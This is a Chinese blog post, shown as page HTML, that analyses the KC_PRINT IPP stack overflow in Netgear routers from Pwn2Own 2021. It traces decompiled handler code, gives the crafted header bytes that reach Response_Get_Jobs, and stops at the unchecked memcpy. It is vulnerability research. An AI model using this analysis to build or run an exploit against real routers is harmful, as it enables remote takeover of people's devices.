<!DOCTYPE html>
<html lang="EN">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析 | Swing&#39;Blog 浮生若梦</title>


<meta name="description" content="Know it then hack it!">


<meta name="author" content="Swing">



<!-- Canonical -->
<link rel="canonical" href="/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html">

<!-- Favicon -->
<link rel="icon" href="/images/favicon.ico">

<!-- RSS -->

<link rel="alternate" type="application/rss+xml" title="Swing&#39;Blog 浮生若梦" href="/atom.xml">


<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析">
<meta property="og:url" content="/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">

<meta property="og:description" content="Know it then hack it!">


<!-- Twitter Card -->
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析">

<meta name="twitter:description" content="Know it then hack it!">


<!-- Theme Color -->
<meta name="theme-color" content="#1d1f21">
<meta name="msapplication-TileColor" content="#1d1f21">

<!-- Stylesheets -->

<link rel="stylesheet" href="/css/style.css">


<!-- Analytics -->


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="theme-dark">
  <div class="container">
    <header class="header">
  <div class="header-inner">
    <div class="header-brand">
      
      <a href="/" class="site-title">
        Swing&#39;Blog 浮生若梦
      </a>
    </div>

    <nav class="nav">
      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
      </button>

      <ul class="nav-menu" id="nav-menu">
        
          
          
            
            <li class="nav-item">
              <a href="/"
                 class="nav-link"
                 >
                Home
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/about/"
                 class="nav-link"
                 >
                About
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/archives/"
                 class="nav-link"
                 >
                Articles
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/atom.xml"
                 class="nav-link"
                 >
                RSS
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/categories/"
                 class="nav-link"
                 >
                Categories
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/link"
                 class="nav-link"
                 >
                Links
              </a>
            </li>
            
          
        
      </ul>
    </nav>
  </div>
</header>


    <main class="main">
      
        <div class="page-layout">
          <article class="post">
  <header class="post-header">
  <h1 class="post-title">Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析</h1>

  <div class="post-meta">
    <span class="meta-item">
      <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zM9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
      <time datetime="2022-09-08">
        2022-09-08
      </time>
    </span>

    

    
      <span class="meta-item">
        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
        
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
        
      </span>
    
  </div>
</header>


  
    <nav class="toc">
  <h3 class="toc-title">Table of Contents</h3>
  <div class="toc-list">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E5%86%99"><span class="toc-text">利用编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-ASLR"><span class="toc-text">Bypass ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-command-execution"><span class="toc-text">Arbitrary command execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
  </div>
</nav>

  

  <div class="post-content">
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天 sectoday 推了一个关于 <code>NCC 研究员参加 Pwn2Own Austin 2021 比赛攻破路由器、NAS、打印机的技术细节分享</code> 的推送。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png"></a></p>
<p>其中有一个篇章是讲 Netgear  R6700 Router 的， 恰好我上上篇分享的文章 <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers
</a> 所使用的路由器型号以及固件版本也在该漏洞影响范围之内。因此打算分析这个漏洞，并自己写一下这个漏洞的 exploit 。</p>
<p>注：</p>
<p>分析以及利用的路由器型号为： R6400v2 ， 固件版本为：V1.0.4.102_10.0.75</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过 slide 可以得知， nccgroup 所发现的漏洞在 <code>KC_PRINT</code>  这个程序里，所攻击端口为 <code>631</code> 端口。 根据我浅薄的知识，第一反映这是一个和 IPP (Internet Printing Protocol，缩写IPP, 是一个用于通过互联网打印文件的标准网络协议) 有关的程序。 在后面的进一步分析的过程中，确实验证了我的猜想。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png"></a></p>
<p><code>KC_PRINT</code> 使用不同的线程来处理不同的功能， </p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png"></a></p>
<p>而该漏洞是发生在 <code>ipp_server</code> 线程里面的。 其大致入口代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;ipp_server: setsockopt SO_REUSEADDR failed&quot;</span>);</span><br><span class="line">   close(fd);</span><br><span class="line">   pthread_attr_destroy(&amp;attr);</span><br><span class="line">   pthread_exit(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> s.sa_family = <span class="number">2</span>;</span><br><span class="line"> *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line"> *(_WORD *)s.sa_data = htons(<span class="number">631u</span>); </span><br><span class="line"> <span class="keyword">if</span> ( bind(fd, &amp;s, <span class="number">0x10</span>u) &lt; <span class="number">0</span> ) <span class="comment">// 在 631 端口监听</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> listen(fd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( flag )</span><br><span class="line"> &#123;</span><br><span class="line">   newfd = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">   <span class="keyword">if</span> ( newfd &gt;= <span class="number">0</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_A0FC(<span class="number">1</span>);</span><br><span class="line">     v1[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">     v1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( setsockopt(newfd, <span class="number">1</span>, <span class="number">20</span>, v1, <span class="number">8u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">       perror(<span class="string">&quot;ipp_server: setsockopt SO_RCVTIMEO failed&quot;</span>);</span><br><span class="line">     Fd = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">     <span class="keyword">if</span> ( Fd )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(Fd, <span class="number">0</span>, <span class="number">8u</span>);</span><br><span class="line">       *Fd = newfd;</span><br><span class="line">       pthread_mutex_lock(&amp;stru_18B40);</span><br><span class="line">       v6 = sub_16068();</span><br><span class="line">       <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">       &#123;</span><br><span class="line">		...</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ( pthread_create(&amp;dword_18740[v6], &amp;attr, do_ipp_http_thread, Fd) )</span><br><span class="line"></span><br><span class="line">		...</span><br></pre></td></tr></table></figure>
<p>然后会进入到  <code>do_ipp_http_thread</code> 函数里， 该函数会进一步调用一个 <code>do_http</code> 的函数。 该函数用来处理对应的 IPP 协议的 HTTP 请求。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">n = recv_n(fd, buf, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(buf, <span class="string">&quot;100-continue&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;POST /USB&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">HTTP_INPUT += <span class="number">9</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;_LQ&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">usblp_index = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="keyword">if</span> ( usblp_index &gt; <span class="number">10</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !is_printer_connected(usblp_index) )     <span class="comment">// 检查是否有打印机设备挂载</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v22[<span class="number">1</span>] = usblp_index;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT += <span class="number">16</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">content_len = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( n != <span class="number">8</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">2</span>) &amp;&amp; (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">6</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = do_airippWithContentLength(v22, content_len, recv_buf);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>首先  <code>  n = recv_n(fd, buf, 1024);</code>  接收 1024 的消息，这一部分消息以  <code>\r\n</code> 作为结束标识， 然后会取出 <code>Content-Length: </code> 的值作为  <code>content_len</code> 传入 <code>do_airippWithContentLength</code> 函数中。</p>
<p>在调用 <code>do_airippWithContentLength</code>  函数之前， 还会读取一个 8 字节长度的消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>该 8 字节长度的消息有一定的格式， 当满足 <code>(recv_buf[2] || recv_buf[3] != 2) &amp;&amp; (recv_buf[2] || recv_buf[3] != 6)</code> 条件的时候才会调用 <code>do_airippWithContentLength</code> 函数。</p>
<p>且进入到 <code>do_airippWithContentLength </code>函数后， 会根据这个 8 个字节长度的消息， 来决定进一步调用哪个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">do_airippWithContentLength</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">size_t</span> content_len, <span class="keyword">const</span> <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *recv_buf; <span class="comment">// [sp+18h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+1Ch] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> Jobs; <span class="comment">// [sp+24h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = *a1;</span><br><span class="line">  recv_buf = <span class="built_in">malloc</span>(content_len);</span><br><span class="line">  <span class="keyword">if</span> ( !recv_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(recv_buf, buf, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( toRead(v8, (recv_buf + <span class="number">8</span>), content_len - <span class="number">8</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">5</span> )</span><br><span class="line">                Jobs = sub_D0C8(a1, recv_buf);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                Jobs = Response_Create_Job(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              Jobs = Response_Get_Jobs(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            Jobs = Response_Get_Job_Attributes(a1, recv_buf, content_len);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Client %d: Cancel-Job\n&quot;</span>, v8);</span><br><span class="line">          Jobs = sub_10EA0(a1, recv_buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>例如此处， 如果我们想调用 <code>Response_Get_Jobs</code> 函数， 我们就得进一步满足 <code> recv_buf[2] || recv_buf[3] == 10</code>  的条件， 才能进到 <code>Response_Get_Jobs</code> 函数里。因此我们可以构造如下的消息：</p>
<p><code>b&#39;\x00\x00\x00\x0a\x00\x00\x99\x99&#39;</code>  让其满足下标为 3 的时候 为 <code>10</code>  即可。 </p>
<p>另外， 在 <code>do_http</code> 函数中有一个 <code>  if ( !is_printer_connected(usblp_index) )     // 检查是否有打印机设备挂载</code> 的判断，该函数会读取 <code>/proc/printer_status</code> 的内容来判断是否有打印机挂载。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( printer_status )</span><br><span class="line">&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/proc/printer_status&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(printer_status, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">    v7 = read(fd, printer_status, <span class="number">0x400</span>u);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(printer_status + v7) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">      <span class="built_in">snprintf</span>(s, <span class="number">0x10</span>u, <span class="string">&quot;usblp%d&quot;</span>, usblp_index - <span class="number">1</span>);</span><br><span class="line">      v7 = <span class="built_in">strstr</span>(printer_status, s) != <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(printer_status);</span><br><span class="line">      printer_status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这里我没有挂载打印机，因此我通过 gdb 来绕过这个判断。</p>
<p>此时已经进到 <code>do_airippWithContentLength</code> 函数，  该函数会进一步根据 <code>content-len - 8</code>  读取后续的更多消息内容。而这个 <code>content-len</code>  是没有进行长度检查的，这里以 <code>Response_Get_Jobs</code> 函数为例， 来做进一步的分析。</p>
<p>在 <code>Response_Get_Jobs</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="number">0</span>;</span><br><span class="line"> prefix_size = <span class="number">0x4A</span>;</span><br><span class="line"> prefix_ptr = <span class="built_in">malloc</span>(<span class="number">0x4A</span>u);</span><br><span class="line"> <span class="keyword">if</span> ( !prefix_ptr )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;Response_Get_Jobs: malloc xx&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">memset</span>(prefix_ptr, <span class="number">0</span>, prefix_size);</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">2u</span>);</span><br><span class="line"> total += cnt;</span><br><span class="line"> <span class="keyword">if</span> ( *recv_buf == <span class="number">1</span> &amp;&amp; !recv_buf[<span class="number">1</span>] )</span><br><span class="line">   flag1 = <span class="number">1</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> total += memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">4u</span>);</span><br><span class="line"> offset += <span class="number">4</span>;</span><br><span class="line"> v12 = <span class="number">66</span>;</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;unk_1823C, <span class="number">0x42</span>u);</span><br><span class="line"> total += cnt;</span><br><span class="line"> ++offset;                                     <span class="comment">// offest == 09</span></span><br><span class="line"> <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line"> <span class="built_in">memset</span>(buf_2048, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_2048));</span><br><span class="line"> buf_2048[subffix_offset++] = <span class="number">5</span>;</span><br><span class="line"> <span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       flag2 = <span class="number">1</span>;</span><br><span class="line">       buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">       copy_len = (recv_buf[offset + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">2</span>];</span><br><span class="line">       cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset + <span class="number">1</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">       subffix_offset += cnt;</span><br><span class="line">     &#125;</span><br><span class="line">     ++offset;                                 <span class="comment">// offset=10</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span> + copy_len;                   <span class="comment">// offset 12</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">     <span class="keyword">if</span> ( flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">       <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">       <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br></pre></td></tr></table></figure>
<p>存在一个缓冲区溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br></pre></td></tr></table></figure>

